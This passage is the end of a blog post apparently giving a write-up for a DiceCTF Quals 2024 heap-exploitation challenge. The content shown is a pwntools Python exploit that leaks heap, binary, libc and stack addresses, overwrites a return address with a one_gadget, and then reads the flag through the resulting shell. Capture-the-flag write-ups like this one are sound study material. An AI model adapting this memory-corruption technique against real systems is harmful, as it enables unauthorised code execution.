+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">curr</span> <span class="o">=</span> <span class="n">heap_offset</span> <span class="o">+</span> <span class="mi">8</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">clap</span><span class="p">(</span><span class="mi">20</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="c1">#writing non-null to 0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x22</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Trying </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">curr</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">clap</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">curr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[</span><span class="mi">13</span><span class="p">:</span><span class="mi">14</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">leak</span> <span class="o">==</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x91</span><span class="s1">&#39;</span><span class="p">:</span> <span class="c1">#if its the start of heap</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">curr</span> <span class="o">-</span> <span class="mi">8</span>
+</span></span><span class="line"><span class="cl">        <span class="n">curr</span> <span class="o">-=</span> <span class="mh">0x1000</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">p</span>
+</span></span><span class="line"><span class="cl">    <span class="n">heap_offset</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">    <span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="n">heap_offset</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">REMOTE</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;mc.ax&#34;</span> <span class="p">,</span> <span class="mi">31040</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;work:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">work</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="n">token</span> <span class="o">=</span> <span class="n">work</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">            <span class="n">PoW</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;./pow </span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">PoW</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">PoW</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">p</span> <span class="o">=</span> <span class="n">exe</span><span class="o">.</span><span class="n">process</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">heap_offset</span> <span class="o">=</span> <span class="n">find_base_heap_offset</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">idx</span> <span class="o">+=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">clap</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">heap_offset</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="c1">#swap back the tcache sizefield</span>
+</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Found heap start @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap_offset</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">#Leak binary base</span>
+</span></span><span class="line"><span class="cl">    <span class="n">slap_length</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">24</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span> <span class="c1">#offset to __dso_handle</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[</span><span class="mi">12</span><span class="p">:</span><span class="o">-</span><span class="mi">6</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">exe</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>  <span class="o">-</span> <span class="mh">0xf008</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;EXE @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">exe</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">clap</span><span class="p">(</span><span class="n">heap_offset</span><span class="o">+</span> <span class="mh">0xab8</span><span class="o">+</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">)</span> <span class="c1">#write nullbyte to third byte, 0x200 probably contain nullbyte since its in the bss</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">clap</span><span class="p">(</span><span class="s2">&#34;1&#34;</span> <span class="o">*</span> <span class="mh">0x700</span><span class="p">,</span> <span class="s2">&#34;1&#34;</span> <span class="o">*</span> <span class="mh">0x900</span><span class="p">)</span> <span class="c1">#free top chunk</span>
+</span></span><span class="line"><span class="cl">    <span class="n">unsorted_bin_offset</span> <span class="o">=</span> <span class="mh">0x16c0</span>
+</span></span><span class="line"><span class="cl">    <span class="n">slap_length</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">heap_offset</span> <span class="o">+</span> <span class="n">unsorted_bin_offset</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[</span><span class="mi">12</span><span class="p">:</span><span class="o">-</span><span class="mi">6</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x21ace0</span>
+</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;LIBC @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">offset_to_environ</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">environ</span> <span class="o">-</span> <span class="n">exe</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">data</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">slap_length</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">offset_to_environ</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[</span><span class="mi">12</span><span class="p">:</span><span class="o">-</span><span class="mi">6</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">stack_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">ret_address</span> <span class="o">=</span> <span class="n">stack_leak</span> <span class="o">-</span> <span class="mh">0x120</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;STACK @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack_leak</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">slap_length</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">ret_address</span> <span class="o">-</span> <span class="n">exe</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">data</span> <span class="o">-</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span> <span class="c1">#copy stack address to RBP</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">char_set_libc</span> <span class="o">=</span> <span class="p">[</span><span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;libc_dump&#34;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()]</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">one_gadget</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0xebc88</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">one_gadget</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">libc</span><span class="o">.</span><span class="n">bss_address</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x21a000</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">idx</span> <span class="o">=</span> <span class="n">char_set_libc</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">+</span> <span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">bss_address</span> <span class="o">-</span> <span class="n">exe</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">clap</span><span class="p">(</span><span class="n">ret_address</span> <span class="o">-</span> <span class="n">exe</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">data</span><span class="p">,</span> <span class="n">idx</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">#input(&#39;WIN&#39;)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">clap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;cat flag.txt&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span></span></span></code></pre></div></div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-02-05</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="http://localhost:1313/posts/dicectf-quals-2024/" data-title="DiceCTF Quals 2024" data-hashtags="pwn,heap"><i class="fab fa-x-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Threads" data-sharer="threads" data-url="http://localhost:1313/posts/dicectf-quals-2024/" data-title="DiceCTF Quals 2024"><i class="fab fa-threads fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://localhost:1313/posts/dicectf-quals-2024/" data-hashtag="pwn"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/posts/dicectf-quals-2024/" data-title="DiceCTF Quals 2024"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://localhost:1313/posts/dicectf-quals-2024/" data-title="DiceCTF Quals 2024"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://localhost:1313/posts/dicectf-quals-2024/" data-title="DiceCTF Quals 2024"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Diaspora" data-sharer="diaspora" data-url="http://localhost:1313/posts/dicectf-quals-2024/" data-title="DiceCTF Quals 2024" data-description="Writeup for the pwn challenges in dicectf"><i class="fab fa-diaspora fa-fw" aria-hidden="true"></i></a><a href="https://t.me/share/url?url=http%3a%2f%2flocalhost%3a1313%2fposts%2fdicectf-quals-2024%2f&amp;text=DiceCTF%20Quals%202024" target="_blank" title="Share on Telegram"><i class="fab fa-telegram fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/pwn/">Pwn</a>,&nbsp;<a href="/tags/heap/">Heap</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/wreckctf-2022/" class="prev" rel="prev" title="WRECKCTF 2022"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>WRECKCTF 2022</a>
+            <a href="/posts/sunshinectf-2024/" class="next" rel="next" title="sunshineCTF 2024">sunshineCTF 2024<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.145.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.3.1-DEV"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">xenonminer</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/lightgallery/lightgallery.min.js"></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script>window.config={"comment":{},"lightgallery":true};</script><script src="/js/theme.min.js"></script></body>
+</html>
